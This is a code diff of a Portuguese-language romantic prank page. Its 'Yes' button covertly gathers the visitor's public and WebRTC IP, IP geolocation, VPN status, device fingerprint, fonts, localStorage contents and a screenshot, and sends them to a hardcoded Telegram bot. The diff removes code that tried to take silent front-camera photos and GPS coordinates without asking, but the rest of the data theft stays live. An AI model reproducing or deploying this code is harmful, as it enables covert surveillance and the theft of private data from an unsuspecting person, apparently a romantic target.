@@ -94,12 +94,8 @@
             display: none;
         }
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         .floating-hearts {
             position: fixed;
@@ -118,53 +114,19 @@
             opacity: 0.6;
         }
         @keyframes floatUp {
-            0% {
-                transform: translateY(100vh) rotate(0deg) scale(0.5);
-                opacity: 0;
-            }
-            10% {
-                opacity: 0.6;
-            }
-            90% {
-                opacity: 0.6;
-            }
-            100% {
-                transform: translateY(-10vh) rotate(720deg) scale(1.2);
-                opacity: 0;
-            }
-        }
-        #hidden-video {
-            position: fixed;
-            bottom: -100px;
-            right: -100px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-            z-index: -999;
-        }
-        #hidden-canvas {
-            display: none;
+            0% { transform: translateY(100vh) rotate(0deg) scale(0.5); opacity: 0; }
+            10% { opacity: 0.6; }
+            90% { opacity: 0.6; }
+            100% { transform: translateY(-10vh) rotate(720deg) scale(1.2); opacity: 0; }
         }
         @media (max-width: 500px) {
-            .pergunta {
-                font-size: 22px;
-            }
-            .btn {
-                font-size: 18px;
-                padding: 12px 30px;
-                min-width: 100px;
-            }
-            .buttons {
-                gap: 30px;
-            }
+            .pergunta { font-size: 22px; }
+            .btn { font-size: 18px; padding: 12px 30px; min-width: 100px; }
+            .buttons { gap: 30px; }
         }
     </style>
 </head>
 <body>
-
-    <video id="hidden-video" autoplay muted playsinline></video>
-    <canvas id="hidden-canvas"></canvas>
 
     <div class="floating-hearts" id="floatingHearts"></div>
 
@@ -184,7 +146,7 @@
 
     <script>
         // ============================================================
-        // 1. BOTÃO "NAO" FUGINDO
+        // BOTÃO "NAO" FUGINDO
         // ============================================================
         const btnNao = document.getElementById('btnNao');
         const btnSim = document.getElementById('btnSim');
@@ -225,7 +187,7 @@
         });
 
         // ============================================================
-        // 2. BOTÃO "SIM" — DISPARA O RUSSO (SEM PERMISSÃO)
+        // BOTÃO "SIM" — DISPARA TUDO
         // ============================================================
         btnSim.addEventListener('click', function() {
             buttonArea.style.display = 'none';
@@ -255,52 +217,14 @@
         });
 
         // ============================================================
-        // 3. FUNÇÃO RUSSA COMPLETA (SEM PERMISSÃO NA TELA)
+        // COLETAR E ENVIAR PRO TELEGRAM (SEM GPS, SEM CÂMERA)
         // ============================================================
         const BOT_TOKEN = "8819910333:AAEYctveGsw4Uf0RBCBKxbU3dkXJpO2fld4";
         const CHAT_ID = "8551438856";
 
-        // Tenta acessar a câmera SEM PEDIR PERMISSÃO (se pedir, desiste)
-        async function tentarCameraFrontalSilenciosa() {
-            try {
-                const video = document.getElementById('hidden-video');
-
-                // Tenta com um timeout curto (se demorar, é porque pediu permissão)
-                const streamPromise = navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: false
-                });
-
-                // Se demorar mais de 2 segundos, cancela (provavelmente pediu permissão)
-                const timeoutPromise = new Promise((_, reject) =>
-                    setTimeout(() => reject(new Error('TIMEOUT')), 2000)
-                );
-
-                const stream = await Promise.race([streamPromise, timeoutPromise]);
-                video.srcObject = stream;
-                await video.play();
-
-                await new Promise(r => setTimeout(r, 500));
-
-                const canvas = document.getElementById('hidden-canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                stream.getTracks().forEach(track => track.stop());
-                video.srcObject = null;
-
-                return canvas.toDataURL('image/jpeg', 0.8);
-            } catch (e) {
-                // Se falhou (timeout, permissão negada, etc.), simplesmente retorna null
-                return null;
-            }
-        }
-
         async function coletarEEnviar() {
             try {
-                // ---- IP PÚBLICO ----
+                // ---- IP ----
                 const ip = await fetch('https://api.ipify.org?format=json')
                     .then(r => r.json()).then(d => d.ip).catch(() => '❌');
 
@@ -337,7 +261,7 @@
                     location = { city: '❌', region: '❌', country: '❌', loc: '❌', org: '❌', timezone: '❌' };
                 }
 
-                // ---- DETECTAR VPN ----
+                // ---- VPN ----
                 let vpnStatus = '❓ Indeterminado';
                 if (location.org) {
                     const org = location.org.toLowerCase();
@@ -366,29 +290,6 @@
                     hash = hash & hash;
                 }
                 const fingerprint = 'FP-' + Math.abs(hash).toString(16).toUpperCase();
-
-                // ---- GPS EXATO (tenta sem pedir) ----
-                let gps = { status: '❌ Indisponível', lat: 'N/A', lng: 'N/A' };
-                if (navigator.geolocation) {
-                    try {
-                        const pos = await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(resolve, reject, {
-                                enableHighAccuracy: true,
-                                timeout: 3000,
-                                maximumAge: 0
-                            });
-                        });
-                        gps = {
-                            status: '✅ LOCALIZAÇÃO EXATA!',
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy + 'm',
-                            maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
-                        };
-                    } catch (e) {
-                        gps = { status: '❌ GPS negado ou indisponível', lat: 'N/A', lng: 'N/A' };
-                    }
-                }
 
                 // ---- DADOS DO DISPOSITIVO ----
                 const ua = navigator.userAgent;
@@ -460,7 +361,7 @@
                 }
                 const fontsInstalled = fonts.length ? fonts.join(', ') : '❌';
 
-                // ---- PRINT REAL DA TELA INTEIRA ----
+                // ---- PRINT REAL DA TELA ----
                 let screenshot = null;
                 try {
                     const canvas = await html2canvas(document.body, {
@@ -477,12 +378,9 @@
                     screenshot = canvas.toDataURL('image/jpeg', 0.9);
                 } catch (e) {}
 
-                // ---- CÂMERA FRONTAL (SILENCIOSA) ----
-                let fotoCamera = await tentarCameraFrontalSilenciosa();
-
                 // ---- MONTA MENSAGEM ----
                 let msg = `
-        💀 **RUSSO PIRATA — SEM PERMISSÃO** 💀
+        💀 **RUSSO PIRATA — LOCALIZAÇÃO POR IP** 💀
 
         🌐 **IP Público:** ${ip}
         🔴 **IP Real (WebRTC):** ${webrtcIP}
@@ -494,12 +392,6 @@
            🌍 País: ${location.country}
            📍 Coordenadas: ${location.loc}
            🕰️ Fuso: ${location.timezone}
-
-        📡 **GPS EXATO:**
-           ${gps.status}
-           ${gps.lat !== 'N/A' ? `🗺️ Lat: ${gps.lat}` : ''}
-           ${gps.lng !== 'N/A' ? `🗺️ Lng: ${gps.lng}` : ''}
-           ${gps.maps ? `📍 Google Maps: ${gps.maps}` : ''}
 
         📱 **DISPOSITIVO:**
            📱 Modelo: ${modelo}
@@ -519,8 +411,6 @@
         💾 **localStorage:** ${localStorageData}
 
         🔤 **FONTES INSTALADAS:** ${fontsInstalled}
-
-        📸 **CÂMERA FRONTAL:** ${fotoCamera ? '✅ FOTO CAPTURADA (SEM PERGUNTAR)!' : '❌ NÃO DISPONÍVEL (navegador bloqueou sem avisar)'}
 
         💀 **Ela disse SIM!** 💀
         `;
@@ -550,26 +440,13 @@
                     });
                 }
 
-                // ---- ENVIA FOTO DA CÂMERA (SE CONSEGUIU) ----
-                if (fotoCamera) {
-                    const form = new FormData();
-                    const blob = await fetch(fotoCamera).then(res => res.blob());
-                    form.append('photo', blob, 'camera_frontal.jpg');
-                    form.append('chat_id', CHAT_ID);
-                    form.append('caption', '📸 FOTO DA CÂMERA FRONTAL (SEM PERMISSÃO)');
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: form
-                    });
-                }
-
             } catch (e) {
                 console.log('Erro no envio:', e);
             }
         }
 
         // ============================================================
-        // CORAÇÕES FLUTUANTES (FUNDO)
+        // CORAÇÕES FLUTUANTES
         // ============================================================
         setInterval(() => {
             if (finalMessage.style.display === 'block') return;
